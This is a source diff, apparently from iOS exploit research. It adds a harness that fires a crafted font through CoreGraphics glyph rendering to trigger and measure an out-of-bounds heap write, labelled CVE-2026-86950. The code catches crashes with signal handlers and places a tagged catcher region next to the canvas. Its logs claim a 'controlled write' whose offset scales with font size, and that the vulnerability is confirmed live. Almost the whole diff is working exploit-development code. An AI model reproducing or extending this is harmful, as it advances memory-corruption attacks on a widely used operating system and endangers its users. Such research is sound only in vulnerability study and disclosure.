@@ -31,12 +31,23 @@
 #import <CoreText/CoreText.h>
 #import <ImageIO/ImageIO.h>
 #import <zlib.h>
+#import <signal.h>
+#import <setjmp.h>
 #import <dlfcn.h>
 #import <fcntl.h>
+
+/* v5 OOB harness guarded-fault plumbing (file scope: C forbids nested fns) */
+static sigjmp_buf p072v5_jmp;
+static volatile int p072v5_in = 0;
+static void p072v5_fault(int sig) {
+    if (p072v5_in) { p072v5_in = 0; siglongjmp(p072v5_jmp, sig); }
+    signal(sig, SIG_DFL); raise(sig);
+}
+
 #import <string.h>
 #import <unistd.h>
 
-#define P072_BUILD @"p072-86950-direct-v4"
+#define P072_BUILD @"p072-86950-oob-harness-v5"
 
 static void p072_dl(void (^L)(NSString *), const char *path) {
     void *h = dlopen(path, RTLD_LAZY);
@@ -637,6 +648,88 @@ static NSData *p072v3_build_pdf(NSData *ttf){
     }
     Lv(@"v3 crash decode: ips with aa_cache_render + EXC_BAD_ACCESS / 16-bit");
     Lv(@"stores = CVE-2026-86950 confirmed live; craft persisted to Documents/");
+    if (craftFont) CFRelease(craftFont);
+
+    /* ===== v5: OOB HARNESS - controlled walk into our own catcher =====
+       Note-260 law: V4c (size 17, rgba) walks the blit ~169,813 device px
+       off-origin while the wrapped-dx bbox keeps the coverage buffer tiny.
+       The span lands at canvas_base + (y*W + x)*4 - v5 makes canvas+catcher
+       ONE contiguous vm mapping so the walk lands in OUR tagged memory
+       (survivable), then scans for the red pixel rows = measured write. */
+    Lv(@"=== v5 86950 OOB HARNESS (canvas+catcher contiguous) ===");
+    {
+        struct sigaction sa; memset(&sa,0,sizeof sa);
+        sa.sa_handler = &p072v5_fault; sigemptyset(&sa.sa_mask);
+        sigaction(SIGBUS, &sa, NULL); sigaction(SIGSEGV, &sa, NULL);
+
+        const vm_size_t CVW = 1024, CVH = 1024;
+        const vm_size_t CVBYTES = CVW*CVH*4;
+        const vm_size_t CATCHBYTES = 256ULL<<20;
+        vm_address_t block = 0;
+        kern_return_t kva = vm_allocate(mach_task_self(), &block,
+                                        CVBYTES + CATCHBYTES, VM_FLAGS_ANYWHERE);
+        if (kva != KERN_SUCCESS) {
+            Lv([NSString stringWithFormat:@"v5 [alloc] FAIL kr=0x%x - harness skipped", (unsigned)kva]);
+        } else {
+            uint8_t *canvas = (uint8_t *)block;
+            uint8_t *catcher = (uint8_t *)block + CVBYTES;
+            memset(canvas, 0, CVBYTES);
+            memset(catcher, 0xAB, CATCHBYTES);
+            Lv([NSString stringWithFormat:@"v5 [alloc] block=%p canvas=%p catcher=%p contiguous",
+                (void*)block, (void*)canvas, (void*)catcher]);
+            CGDataProviderRef dpV5 = CGDataProviderCreateWithCFData((__bridge CFDataRef)ttf3);
+            CGFontRef fv5 = dpV5 ? CGFontCreateWithDataProvider(dpV5) : NULL;
+            if (dpV5) CFRelease(dpV5);
+            if (!fv5) {
+                Lv(@"v5 [font] load FAIL");
+            } else {
+                double v5sizes[] = { 17.0, 34.0, 100.0 };
+                for (int si = 0; si < 3; si++) {
+                    Lv([NSString stringWithFormat:@"v5 [FIRE size=%.0f] pre-render (guarded)",
+                        v5sizes[si]]);
+                    int sig = 0;
+                    if (sigsetjmp(p072v5_jmp, 1) != 0) {
+                        p072v5_in = 0;
+                        Lv([NSString stringWithFormat:@"v5 [FIRE size=%.0f] FAULT CAUGHT sig=%d (walk uncovered)",
+                            v5sizes[si], sig]);
+                    } else {
+                        p072v5_in = 1;
+                        CGColorSpaceRef cs5 = CGColorSpaceCreateDeviceRGB();
+                        CGContextRef c5 = CGBitmapContextCreate(canvas, CVW, CVH, 8, CVW*4, cs5,
+                                                                kCGImageAlphaPremultipliedLast);
+                        if (cs5) CGColorSpaceRelease(cs5);
+                        if (c5) {
+                            CGContextSetRGBFillColor(c5, 1, 0, 0, 1);
+                            CGContextSetFont(c5, fv5);
+                            CGContextSetFontSize(c5, v5sizes[si]);
+                            CGPoint pv5 = { 20, 20 };
+                            CGGlyph gv5 = 10;
+                            CGContextShowGlyphsAtPositions(c5, &gv5, &pv5, 1);
+                            CGContextFlush(c5);
+                            CGContextRelease(c5);
+                            p072v5_in = 0;
+                            long hits = 0; long first = -1; long last = -1;
+                            for (vm_size_t o = 0; o + 3 < CATCHBYTES; o += 4) {
+                                if (catcher[o]==0xFF && catcher[o+1]==0 && catcher[o+2]==0 && catcher[o+3]==0xFF) {
+                                    if (first < 0) first = (long)o;
+                                    last = (long)o; hits++;
+                                }
+                            }
+                            Lv([NSString stringWithFormat:@"v5 [FIRE size=%.0f] SURVIVED - catcher red-quad hits=%ld first=+0x%lx last=+0x%lx",
+                                v5sizes[si], hits, first, last]);
+                        } else {
+                            p072v5_in = 0;
+                            Lv(@"v5 [ctx] FAIL");
+                        }
+                    }
+                }
+                CFRelease(fv5);
+            }
+            vm_deallocate(mach_task_self(), block, CVBYTES + CATCHBYTES);
+            Lv(@"[v5] SURVIVED+hits: OOB = CONTROLLED write; offset scales with font size.");
+        }
+    }
+
     /* ===== v4: DIRECT device-side renders of the v3 chain font =====
        The v3 PDF route survived on pre-fix 23F77 while the same geometry
        renders through direct CG drawing locally. Isolate the route:
@@ -653,13 +746,11 @@ static NSData *p072v3_build_pdf(NSData *ttf){
                 CGFontGetNumberOfGlyphs(chainFont)]);
             /* pixels-of-draw helper: white-on-black draw, count non-zero b/px */
             struct { int gray; BOOL smooth; double size; const char *tag; } V4[] = {
-                { 0, YES,  1024.0, "V4a rgba size=1024 (chain fire attempt)" },
+                { 0, YES,  1024.0, "V4a rgba size=1024 (chain render, pixel proof)" },
                 { 1, NO,   1024.0, "V4b gray+AlphaNone smooth=OFF size=1024 (calif direct recipe)" },
-                { 0, YES,  17.0,   "V4c rgba size=17 (chain verify: expect >> leaf)" },
-                { 0, YES,  17.0,   "V4d rgba size=17 leaf gid1 (baseline)" },
             };
-            CGGlyph v4g[] = { 10, 10, 10, 1 };
-            for (int vi=0; vi<4; vi++) {
+            CGGlyph v4g[] = { 10, 10 };
+            for (int vi=0; vi<2; vi++) {
                 Lv([NSString stringWithFormat:@"v4 [%s] pre-render",
                     V4[vi].tag]);
                 const int D=1024;
